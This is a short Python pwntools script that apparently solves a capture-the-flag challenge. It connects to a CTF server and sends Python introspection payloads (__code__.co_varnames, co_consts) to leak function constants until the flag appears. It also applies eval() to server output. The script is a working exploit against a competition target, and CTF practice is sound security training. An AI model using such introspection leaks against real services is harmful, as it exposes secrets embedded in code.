from pwn import *

conn = remote('misc.ctf.shellmates.club',1300)

conn.recv()
conn.sendline(b'main.__code__.co_varnames')
t = conn.recvuntil(b')')
functions = eval(t)

for function in functions:
    conn.recvuntil(b'>>')
    payload = function.encode()+b".__code__.co_consts"
    conn.sendline(payload)
    tmp = conn.recvline()
    if b'shellmates' in tmp:
        print(tmp)
        break
conn.close()
